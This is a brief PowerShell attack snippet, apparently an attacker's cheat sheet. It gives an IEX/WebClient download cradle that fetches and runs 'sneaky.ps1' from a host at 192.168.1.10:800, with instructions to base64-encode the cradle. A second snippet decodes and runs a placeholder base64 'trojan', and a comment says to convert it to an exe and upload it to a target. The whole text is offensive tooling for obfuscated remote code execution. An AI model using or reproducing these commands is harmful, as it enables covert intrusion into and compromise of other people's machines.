# Powershell base64 encode this: ----->
IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.10:800/sneaky.ps1')

# Convert this script to exe file and upload to target: ----->
$A =[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("INSERT_BASE64_ENCODED_TROJAN"))
powershell -noprofile $A
